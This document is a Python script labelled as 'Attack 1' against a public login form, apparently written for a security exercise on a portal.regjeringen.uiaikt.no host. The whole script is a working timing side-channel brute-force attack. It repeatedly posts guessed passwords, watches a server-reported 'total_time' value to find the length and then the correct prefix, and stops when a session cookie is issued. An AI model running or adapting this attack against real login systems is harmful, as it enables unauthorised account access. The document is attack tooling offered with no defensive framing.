# The Python script for Attack 1 (the public login form)

import json
import requests
import string
import random

url = "https://portal.regjeringen.uiaikt.no/login"

# Define the headers
headers = {
    'Content-Type': 'application/json'
}

# Define the payload
payload = {}

def gen_password(length, cur_correct_password = None):
    characters = string.ascii_letters + string.digits

    # Generate the random string
    if cur_correct_password != None:
        random_string = ''.join(random.choice(characters) for _ in range(length - len(cur_correct_password)))
        random_string = cur_correct_password + random_string
    else:
        random_string = ''.join(random.choice(characters) for _ in range(length))

    return random_string

found_length = False
length = 1
timing = 0

while True:

    if found_length:
        payload["password"] = gen_password(length, payload["password"][:timing-1])
    else:
        payload["password"] = gen_password(length)

    print("Trying password: " + payload["password"])

    # Convert dict to JSON
    data = json.dumps(payload)

    # Send the POST request
    response = requests.post(url, headers=headers, data=data, timeout=30)

    # Check the status code
    if 500 > response.status_code:
        try:
            # Try to read the response into a JSON
            response_json = response.json()
            total_time = response_json["total_time"]
            if total_time != timing:
                timing = total_time
                found_length = True
            elif found_length == False:
                length += 1
        except:
            # Handle the case where the response is not a JSON
            if "Set-Cookie" in response.headers:
                print("Found password: " + payload["password"])
                break
            else:
                print("Non-JSON response found: ")
                print(response.text)
    else:
        print(f'Request failed with status code {response.status_code}')
